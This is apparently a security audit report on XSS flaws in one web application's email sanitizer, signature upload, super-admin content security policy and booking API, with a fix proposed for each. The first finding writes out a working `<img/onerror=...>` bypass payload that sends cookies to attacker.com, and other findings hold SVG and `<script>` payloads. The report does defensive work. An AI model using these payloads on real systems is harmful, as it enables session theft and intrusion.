# S13 — XSS: Admin Pages, Email/SMS Templates, Public Booking

Audited: admin panel JS, super-admin SPA CSP, email service sanitizer,
notification routes, booking public routes, estimateSign, ticketSignatures,
paymentLinks, reportEmailer, automations, notificationPrefs.

---

### MEDIUM — Email sanitizer regex bypassed by `/` tag-separator (no `\s` required)

**Where:** `packages/server/src/services/email.ts:176-178`

**What:**
`sanitizeEmailHtml()` strips inline event handlers with three regexes, each requiring `\s+` (one or more whitespace) *before* the `on*=` attribute name. HTML parsers (and mail clients) also accept `/` as the separator between tag name and attributes — `<img/onerror=...>` is valid HTML5. The three regexes all require `\s+` so `/onerror=` is never matched and the payload reaches the recipient's mail client unmodified. The same bypass works with any void element: `<svg/onload=...>`, `<iframe/onload=...>`, `<details/open/ontoggle=...>`.

**Code:**
```typescript
// services/email.ts:176-178
out = out.replace(/\s+on[a-z]+\s*=\s*"[^"]*"/gi, '');
out = out.replace(/\s+on[a-z]+\s*=\s*'[^']*'/gi, '');
out = out.replace(/\s+on[a-z]+\s*=\s*[^\s>]+/gi, '');
// "/onerror=" is NOT matched by any of the three patterns above
```

**Exploit:**
An admin-role user edits a notification template via `PUT /api/v1/settings/notification-templates/:id` with `email_body` containing `<img/onerror="fetch('https://attacker.com/?c='+document.cookie)" src=x>`. When the template fires automatically (ticket status change, dunning, automations), the body passes `sanitizeEmailHtml()` untouched and reaches every customer's mail client that renders HTML email. In webmail clients (Gmail, Outlook Web, Yahoo) this executes JavaScript in the webmail origin — exfiltrating session cookies or performing DOM-based actions. Because `notifications.ts` HTML-escapes *template variables* (customer_name etc.) but the *template literal itself* goes through the broken sanitizer, the attacker only needs to control the stored template, not any customer field.

**Fix:**
Replace the regex-based sanitizer with a proper allow-list HTML sanitizer such as `sanitize-html` (already in many Node projects) or `DOMPurify` (via `isomorphic-dompurify`). At minimum change the whitespace class from `\s+` to `[\s/]` to match the `/` separator: `/[\s/]+on[a-z]+\s*=\s*/`. The comment in `email.ts:164` already acknowledges the limitation ("Not a full HTML parser — adversarial HTML needs a library like DOMPurify").

---

### MEDIUM — `data:image/svg+xml` accepted as estimate signature; stored XSS in admin viewer

**Where:** `packages/server/src/routes/estimateSign.routes.ts:58-60, 526-537`

**What:**
The public `POST /public/api/v1/estimate-sign/:token` endpoint validates `signature_data_url` only by checking that it starts with one of the accepted prefixes. `data:image/svg+xml;base64,` is explicitly accepted. An SVG data-URI may contain `<script>` blocks or inline event handlers that execute when the browser renders the URI. The stored value is later returned from `GET /api/v1/estimates/:id/signatures` (admin-authed endpoint) and from `GET /api/v1/tickets/:id/signatures/:signatureId` and rendered as `<img src={sig.signature_data_url}>` in the React SPA `PrintPage.tsx`. Although modern browsers block script execution in SVGs loaded via `<img>`, the SVG is also stored in the DB and may be used in downstream email receipts, PDF exports, or future rendering paths where an inline `<object>` or `<embed>` would activate the payload.

**Code:**
```typescript
// estimateSign.routes.ts:58-60
const ACCEPTED_DATA_URL_PREFIXES = [
  'data:image/png;base64,',
  'data:image/svg+xml;base64,',  // ← SVG accepts <script> inside base64 blob
];
// Only size-cap enforced; content of base64 payload not inspected
const base64Part = signatureDataUrl.slice(validPrefix.length);
const approxBytes = Math.ceil(base64Part.length * 3 / 4);
if (approxBytes > MAX_SIGNATURE_BYTES) { throw ... }
```

**Exploit:**
An unauthenticated customer (with a valid sign-link) submits `signature_data_url: "data:image/svg+xml;base64,<base64 of SVG containing <script>alert(document.cookie)</script>>"`. The value is stored in `estimate_signatures.signature_data_url`. When an admin fetches and displays the signature in a future path that uses `<object>` or `<embed>` instead of `<img>` (e.g. a generated PDF via puppeteer/wkhtmltopdf that inlines SVG), the script executes in the admin browser context. Even in the current `<img>` path, the SVG `<use>` trick and certain legacy browser combinations can trigger XSS.

**Fix:**
Remove `data:image/svg+xml;base64,` from `ACCEPTED_DATA_URL_PREFIXES`. Only `data:image/png;base64,` and `data:image/jpeg;base64,` are raster formats safe for `<img>` rendering. Signature capture UIs produce PNG output from `<canvas>.toDataURL()`; SVG support provides no user benefit. Additionally decode and validate the base64 payload to confirm it is a valid PNG/JPEG header before storing.

---

### LOW — Super-admin SPA served with `unsafe-inline` script-src; CSP provides no XSS protection

**Where:** `packages/server/src/index.ts:1495`

**What:**
The super-admin SPA at `/super-admin` is served with `script-src 'self' 'unsafe-inline'`. This completely nullifies the `script-src` directive as a defense-in-depth control: any stored XSS that reaches the super-admin DOM can inject an inline `<script>` that executes. The comment acknowledges that `unsafe-inline` is "the cost of running a Vite bundle" (inline bootstrap scripts). Modern Vite can emit a nonce or hash for the module-preload bootstrap, eliminating the need for `unsafe-inline`.

**Code:**
```typescript
// index.ts:1495
const spaCsp = "default-src 'self'; script-src 'self' 'unsafe-inline'; " +
               "script-src-attr 'none'; style-src 'self' 'unsafe-inline'; " +
               "img-src 'self' data: blob:; connect-src 'self' ws: wss:; " +
               "font-src 'self' data:; frame-ancestors 'none'";
```

**Exploit:**
If any future stored-XSS path reaches the super-admin panel (e.g. a tenant name displayed in the tenants table), the `unsafe-inline` policy means an attacker can inject `<script>alert(1)</script>` and have it execute inside the super-admin context — which has full cross-tenant control (create/delete tenants, impersonate). Currently mitigated by `localhostOnly` restricting `/super-admin` to loopback.

**Fix:**
Configure Vite to emit `<script type="module">` without inline bootstrap, or inject a per-request nonce into the HTML and pass it to the CSP header as `'nonce-<value>'` instead of `'unsafe-inline'`. See Vite `build.modulePreload.polyfill` and `build.cssCodeSplit` options.

---

### LOW — `master_db_size_mb` interpolated into innerHTML without `esc()` in legacy super-admin.js

**Where:** `packages/server/src/admin/js/super-admin.js:283`

**What:**
`renderBackupsTab()` uses `esc()` for all tenant row fields but interpolates `data.data.master_db_size_mb` directly without escaping. Although the value is computed server-side as a `Math.round(...)` float (making it numeric in practice), the server returns it as a JSON number; if the server-side logic ever changes to pass a string (e.g. error fallback), the unescaped interpolation into an active `innerHTML` assignment becomes XSS. The `super-admin.js` file is still statically served at `/admin/js/super-admin.js`.

**Code:**
```javascript
// admin/js/super-admin.js:283
html += `</tbody></table>
  <p ...>Master DB: ${data.data.master_db_size_mb} MB</p></div>`;
// compare: all other values use esc() — esc(b.slug), esc(b.name), esc(b.db_size_mb)
```

**Exploit:**
The old `super-admin.html` page is no longer served, so the `super-admin.js` code is not directly reachable via a browser UI path. However, if a future refactor re-exposes this script or the SPA imports it, and if `master_db_size_mb` becomes a non-numeric value (e.g. `"&lt;script&gt;alert(1)&lt;/script&gt;"` from a config error), it would execute. Additionally the `renderDashboard()` tab's KPI grid (lines 191-197) also skips `esc()` for `d.active_tenants`, `d.total_tenants`, `d.suspended_tenants`, `d.total_db_size_mb`, `d.memory_mb`, `d.uptime_hours` — all of which are server-computed numbers but lack the `esc()` defensive wrapper applied to user-facing fields.

**Fix:**
Wrap all interpolated values in `esc()` regardless of their expected type — a defensive invariant. Change `${data.data.master_db_size_mb}` to `${esc(data.data.master_db_size_mb)}` and apply the same fix to the KPI grid. Since the old panel is no longer served, this is low priority but should be fixed before the file is reused.

---

### INFO — Email sanitizer explicitly self-documented as insufficient; no library replacement scheduled

**Where:** `packages/server/src/services/email.ts:161-166`

**What:**
The `sanitizeEmailHtml()` function contains a comment that reads: "Not a full HTML parser — adversarial HTML needs a library like DOMPurify or sanitize-html". The code comment acknowledges the limitation but no Jira/task reference or migration plan exists. This is a known technical debt item that is explicitly in scope for XSS review (SCAN-1051b).

**Code:**
```typescript
// SCAN-1051b: best-effort HTML sanitizer for outbound email bodies. We strip
// `<script>` and inline event handlers (e.g. `onerror=`, `onclick=`) before
// handing the blob to nodemailer. Not a full HTML parser — adversarial HTML
// needs a library like DOMPurify or sanitize-html — but it closes the easy
// XSS path from admin-authored automation templates
```

**Exploit:**
N/A — this is a tracking note. See the MEDIUM finding above for the concrete bypass.

**Fix:**
Replace `sanitizeEmailHtml()` with `sanitize-html` or `isomorphic-dompurify`. Allow only the standard formatting tags needed for transactional email (p, b, i, ul, li, a with https: href, br). This eliminates entire classes of bypass rather than patching individual patterns. Remove the `// SCAN-1051b` comment once the library is integrated.

---

### INFO — Public booking confirmation JSON reflects unescaped store_name/store_phone to API consumers

**Where:** `packages/server/src/routes/bookingPublic.routes.ts:174-191`

**What:**
`GET /public/api/v1/booking/config` returns `store_name` and `store_phone` raw from `store_config`. These values are set by the tenant admin and could contain HTML if the admin mistakenly includes markup. The values are returned as JSON (safe) but there is no validation that these fields are plain-text; downstream consumers that interpolate the values directly into `innerHTML` without escaping (e.g. a third-party widget) would be vulnerable. The booking public routes return only JSON — there is no server-side HTML template involved — so this is an information-level concern for consumers of the API.

**Code:**
```typescript
// bookingPublic.routes.ts:175-177
res.json({
  success: true,
  data: {
    store_name: nameRow?.value ?? null,   // raw, no sanitize
    store_phone: phoneRow?.value ?? null, // raw, no sanitize
```

**Exploit:**
No direct server-side XSS. A third-party web widget consuming this endpoint and doing `element.innerHTML = data.store_name` would be vulnerable if a compromised tenant store_config row contains `<script>alert(1)</script>`. The API itself is safe JSON.

**Fix:**
Add server-side strip of HTML tags from `store_name` and `store_phone` before returning them in the public booking config response. Use a simple `value.replace(/<[^>]+>/g, '')` or validate that these config fields contain no `<` characters when they are saved via the settings routes.

---
